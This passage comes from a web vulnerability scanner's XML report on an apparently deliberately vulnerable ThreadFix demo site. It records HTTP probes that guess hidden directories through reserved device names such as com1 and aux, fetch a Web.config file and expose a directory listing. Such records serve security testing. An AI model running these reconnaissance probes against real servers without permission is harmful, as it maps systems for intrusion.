&lt;!-- XSS TEST - STORED --&gt;
&lt;!-- The goal is to pull the payload from the database. After that we'll see. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Threadfix Vulnerability Demos&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Demo List &lt;/h2&gt;
	&lt;ol&gt;
		&lt;li&gt;&lt;a href="XSS.php"&gt;XSS&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="SQLI.php"&gt;SQL Injection&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PredictableResource.php"&gt;Predictable Resource Location&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PathTraversal.php?action=PathTraversal.php"&gt;Path Traversal&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="DirectoryIndexing/"&gt;Directory Indexing&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="XPathInjection.php"&gt;XPath Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="LDAPInjection.php"&gt;LDAP Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="FormatString.php"&gt;Format String Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="OSCommandInjection.php"&gt;OS Command Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="EvalInjection.php"&gt;Eval Injection&lt;/a&gt;&lt;/li&gt;
	&lt;/ol&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /com1/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 403 Forbidden
Content-Length: 207
Date: Mon, 14 Jul 2014 14:45:37 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Forbidden&lt;/h1&gt;
&lt;p&gt;You don't have permission to access /com1/
on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attDirectoryFound" Noise="False">
        <Url>http://tftarget/com2/</Url>
        <Entity />
        <Variant ID="3132">
          <Comments />
          <Difference>path: cookie /demo/ -&gt; /com2/</Difference>
          <Reasoning>The test tried to detect hidden directories on the server. The 403 Forbidden response reveals the existence of the directory, even though access is not allowed.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="142" Length="3" String="403" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 900
Date: Mon, 14 Jul 2014 14:44:46 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
ETag: "2000000023431-384-4a54837b0b761"
Accept-Ranges: bytes
Connection: close
Content-Type: text/html

&lt;!-- XSS TEST - STORED --&gt;
&lt;!-- The goal is to pull the payload from the database. After that we'll see. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Threadfix Vulnerability Demos&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Demo List &lt;/h2&gt;
	&lt;ol&gt;
		&lt;li&gt;&lt;a href="XSS.php"&gt;XSS&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="SQLI.php"&gt;SQL Injection&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PredictableResource.php"&gt;Predictable Resource Location&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PathTraversal.php?action=PathTraversal.php"&gt;Path Traversal&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="DirectoryIndexing/"&gt;Directory Indexing&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="XPathInjection.php"&gt;XPath Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="LDAPInjection.php"&gt;LDAP Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="FormatString.php"&gt;Format String Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="OSCommandInjection.php"&gt;OS Command Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="EvalInjection.php"&gt;Eval Injection&lt;/a&gt;&lt;/li&gt;
	&lt;/ol&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /com2/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 403 Forbidden
Content-Length: 207
Date: Mon, 14 Jul 2014 14:45:37 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Forbidden&lt;/h1&gt;
&lt;p&gt;You don't have permission to access /com2/
on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attDirectoryFound" Noise="False">
        <Url>http://tftarget/com3/</Url>
        <Entity />
        <Variant ID="3133">
          <Comments />
          <Difference>path: cookie /demo/ -&gt; /com3/</Difference>
          <Reasoning>The test tried to detect hidden directories on the server. The 403 Forbidden response reveals the existence of the directory, even though access is not allowed.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="142" Length="3" String="403" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 900
Date: Mon, 14 Jul 2014 14:44:46 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
ETag: "2000000023431-384-4a54837b0b761"
Accept-Ranges: bytes
Connection: close
Content-Type: text/html

&lt;!-- XSS TEST - STORED --&gt;
&lt;!-- The goal is to pull the payload from the database. After that we'll see. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Threadfix Vulnerability Demos&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Demo List &lt;/h2&gt;
	&lt;ol&gt;
		&lt;li&gt;&lt;a href="XSS.php"&gt;XSS&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="SQLI.php"&gt;SQL Injection&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PredictableResource.php"&gt;Predictable Resource Location&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PathTraversal.php?action=PathTraversal.php"&gt;Path Traversal&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="DirectoryIndexing/"&gt;Directory Indexing&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="XPathInjection.php"&gt;XPath Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="LDAPInjection.php"&gt;LDAP Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="FormatString.php"&gt;Format String Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="OSCommandInjection.php"&gt;OS Command Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="EvalInjection.php"&gt;Eval Injection&lt;/a&gt;&lt;/li&gt;
	&lt;/ol&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /com3/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 403 Forbidden
Content-Length: 207
Date: Mon, 14 Jul 2014 14:45:37 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Forbidden&lt;/h1&gt;
&lt;p&gt;You don't have permission to access /com3/
on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="cwvWebConfig" Noise="False">
        <Url>http://tftarget/demo/</Url>
        <Entity />
        <Variant ID="5311">
          <Comments />
          <Difference>path: path /demo/ -&gt; /demo/Web.config</Difference>
          <Reasoning>The test successfully retrieved the "Web.config" file, which is an ASP.NET application-wide configuration file.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="454" Length="15" String="&lt;configuration&gt;" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 900
Date: Mon, 14 Jul 2014 14:44:46 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
ETag: "2000000023431-384-4a54837b0b761"
Accept-Ranges: bytes
Connection: close
Content-Type: text/html

&lt;!-- XSS TEST - STORED --&gt;
&lt;!-- The goal is to pull the payload from the database. After that we'll see. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Threadfix Vulnerability Demos&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Demo List &lt;/h2&gt;
	&lt;ol&gt;
		&lt;li&gt;&lt;a href="XSS.php"&gt;XSS&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="SQLI.php"&gt;SQL Injection&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PredictableResource.php"&gt;Predictable Resource Location&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PathTraversal.php?action=PathTraversal.php"&gt;Path Traversal&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="DirectoryIndexing/"&gt;Directory Indexing&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="XPathInjection.php"&gt;XPath Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="LDAPInjection.php"&gt;LDAP Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="FormatString.php"&gt;Format String Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="OSCommandInjection.php"&gt;OS Command Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="EvalInjection.php"&gt;Eval Injection&lt;/a&gt;&lt;/li&gt;
	&lt;/ol&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/Web.config HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 168
Date: Mon, 14 Jul 2014 14:46:02 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Wed, 01 Jun 2011 14:10:16 GMT
ETag: "200000002343c-a8-4a4a7146ca200"
Accept-Ranges: bytes
Connection: close
Content-Type: text/plain

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;configuration&gt;
    &lt;system.webServer&gt;
        &lt;directoryBrowse enabled="true" /&gt;
    &lt;/system.webServer&gt;
&lt;/configuration&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attDirectoryFound" Noise="False">
        <Url>http://tftarget/demo/aux/</Url>
        <Entity />
        <Variant ID="8063">
          <Comments />
          <Difference>path: path /demo/ -&gt; /demo/aux/</Difference>
          <Reasoning>The test tried to detect hidden directories on the server. The 403 Forbidden response reveals the existence of the directory, even though access is not allowed.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="146" Length="3" String="403" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 900
Date: Mon, 14 Jul 2014 14:44:46 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
ETag: "2000000023431-384-4a54837b0b761"
Accept-Ranges: bytes
Connection: close
Content-Type: text/html

&lt;!-- XSS TEST - STORED --&gt;
&lt;!-- The goal is to pull the payload from the database. After that we'll see. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Threadfix Vulnerability Demos&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Demo List &lt;/h2&gt;
	&lt;ol&gt;
		&lt;li&gt;&lt;a href="XSS.php"&gt;XSS&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="SQLI.php"&gt;SQL Injection&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PredictableResource.php"&gt;Predictable Resource Location&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PathTraversal.php?action=PathTraversal.php"&gt;Path Traversal&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="DirectoryIndexing/"&gt;Directory Indexing&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="XPathInjection.php"&gt;XPath Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="LDAPInjection.php"&gt;LDAP Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="FormatString.php"&gt;Format String Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="OSCommandInjection.php"&gt;OS Command Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="EvalInjection.php"&gt;Eval Injection&lt;/a&gt;&lt;/li&gt;
	&lt;/ol&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/aux/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 403 Forbidden
Content-Length: 211
Date: Mon, 14 Jul 2014 14:46:33 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Forbidden&lt;/h1&gt;
&lt;p&gt;You don't have permission to access /demo/aux/
on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attDirectoryFound" Noise="False">
        <Url>http://tftarget/demo/com1/</Url>
        <Entity />
        <Variant ID="8124">
          <Comments />
          <Difference>path: path /demo/ -&gt; /demo/com1/</Difference>
          <Reasoning>The test tried to detect hidden directories on the server. The 403 Forbidden response reveals the existence of the directory, even though access is not allowed.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="147" Length="3" String="403" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 900
Date: Mon, 14 Jul 2014 14:44:46 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
ETag: "2000000023431-384-4a54837b0b761"
Accept-Ranges: bytes
Connection: close
Content-Type: text/html

&lt;!-- XSS TEST - STORED --&gt;
&lt;!-- The goal is to pull the payload from the database. After that we'll see. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Threadfix Vulnerability Demos&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Demo List &lt;/h2&gt;
	&lt;ol&gt;
		&lt;li&gt;&lt;a href="XSS.php"&gt;XSS&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="SQLI.php"&gt;SQL Injection&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PredictableResource.php"&gt;Predictable Resource Location&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PathTraversal.php?action=PathTraversal.php"&gt;Path Traversal&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="DirectoryIndexing/"&gt;Directory Indexing&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="XPathInjection.php"&gt;XPath Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="LDAPInjection.php"&gt;LDAP Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="FormatString.php"&gt;Format String Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="OSCommandInjection.php"&gt;OS Command Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="EvalInjection.php"&gt;Eval Injection&lt;/a&gt;&lt;/li&gt;
	&lt;/ol&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/com1/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 403 Forbidden
Content-Length: 212
Date: Mon, 14 Jul 2014 14:46:33 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Forbidden&lt;/h1&gt;
&lt;p&gt;You don't have permission to access /demo/com1/
on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attDirectoryFound" Noise="False">
        <Url>http://tftarget/demo/com2/</Url>
        <Entity />
        <Variant ID="8125">
          <Comments />
          <Difference>path: path /demo/ -&gt; /demo/com2/</Difference>
          <Reasoning>The test tried to detect hidden directories on the server. The 403 Forbidden response reveals the existence of the directory, even though access is not allowed.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="147" Length="3" String="403" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 900
Date: Mon, 14 Jul 2014 14:44:46 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
ETag: "2000000023431-384-4a54837b0b761"
Accept-Ranges: bytes
Connection: close
Content-Type: text/html

&lt;!-- XSS TEST - STORED --&gt;
&lt;!-- The goal is to pull the payload from the database. After that we'll see. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Threadfix Vulnerability Demos&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Demo List &lt;/h2&gt;
	&lt;ol&gt;
		&lt;li&gt;&lt;a href="XSS.php"&gt;XSS&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="SQLI.php"&gt;SQL Injection&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PredictableResource.php"&gt;Predictable Resource Location&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PathTraversal.php?action=PathTraversal.php"&gt;Path Traversal&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="DirectoryIndexing/"&gt;Directory Indexing&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="XPathInjection.php"&gt;XPath Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="LDAPInjection.php"&gt;LDAP Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="FormatString.php"&gt;Format String Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="OSCommandInjection.php"&gt;OS Command Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="EvalInjection.php"&gt;Eval Injection&lt;/a&gt;&lt;/li&gt;
	&lt;/ol&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/com2/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 403 Forbidden
Content-Length: 212
Date: Mon, 14 Jul 2014 14:46:33 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Forbidden&lt;/h1&gt;
&lt;p&gt;You don't have permission to access /demo/com2/
on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attDirectoryFound" Noise="False">
        <Url>http://tftarget/demo/com3/</Url>
        <Entity />
        <Variant ID="8126">
          <Comments />
          <Difference>path: path /demo/ -&gt; /demo/com3/</Difference>
          <Reasoning>The test tried to detect hidden directories on the server. The 403 Forbidden response reveals the existence of the directory, even though access is not allowed.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="147" Length="3" String="403" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 200 OK
Content-Length: 900
Date: Mon, 14 Jul 2014 14:44:46 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Last-Modified: Thu, 09 Jun 2011 14:24:57 GMT
ETag: "2000000023431-384-4a54837b0b761"
Accept-Ranges: bytes
Connection: close
Content-Type: text/html

&lt;!-- XSS TEST - STORED --&gt;
&lt;!-- The goal is to pull the payload from the database. After that we'll see. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;Threadfix Vulnerability Demos&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;h2&gt; Demo List &lt;/h2&gt;
	&lt;ol&gt;
		&lt;li&gt;&lt;a href="XSS.php"&gt;XSS&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="SQLI.php"&gt;SQL Injection&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PredictableResource.php"&gt;Predictable Resource Location&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="PathTraversal.php?action=PathTraversal.php"&gt;Path Traversal&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="DirectoryIndexing/"&gt;Directory Indexing&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="XPathInjection.php"&gt;XPath Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="LDAPInjection.php"&gt;LDAP Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="FormatString.php"&gt;Format String Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="OSCommandInjection.php"&gt;OS Command Injection&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="EvalInjection.php"&gt;Eval Injection&lt;/a&gt;&lt;/li&gt;
	&lt;/ol&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/com3/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget


HTTP/1.1 403 Forbidden
Content-Length: 212
Date: Mon, 14 Jul 2014 14:46:33 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;403 Forbidden&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Forbidden&lt;/h1&gt;
&lt;p&gt;You don't have permission to access /demo/com3/
on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attDirectoryGuessing" Noise="False">
        <Url>http://tftarget/demo/DirectoryIndexing/</Url>
        <Entity />
        <Variant ID="10231">
          <Comments />
          <Difference />
          <Reasoning>The response contains the content of a directory (directory listing). This indicates that the server allows the listing of directories, which is not usually recommended.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="439" Length="10" String="Index of /" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>GET /demo/DirectoryIndexing/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 297
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html;charset=UTF-8

&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /demo/DirectoryIndexing&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /demo/DirectoryIndexing&lt;/h1&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href="/demo/"&gt; Parent Directory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="admin.txt"&gt; admin.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/body&gt;&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>GET /demo/DirectoryIndexing/ HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/


HTTP/1.1 200 OK
Content-Length: 297
Date: Mon, 14 Jul 2014 14:47:00 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html;charset=UTF-8

&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /demo/DirectoryIndexing&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /demo/DirectoryIndexing&lt;/h1&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href="/demo/"&gt; Parent Directory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="admin.txt"&gt; admin.txt&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attDirectoryGuessing" Noise="False">
        <Url>http://tftarget/demo/DIRECT~1/</Url>
        <Entity />
        <Variant ID="10235">
          <Comments />
          <Difference>path: cookie /demo/DirectoryIndexing/ -&gt; /demo/DIRECT~1/</Difference>
          <Reasoning>The response contains the content of a directory (directory listing). This indicates that the server allows the listing of directories, which is not usually recommended.</Reasoning>
          <ValidationDataLocationAtTestResponse>
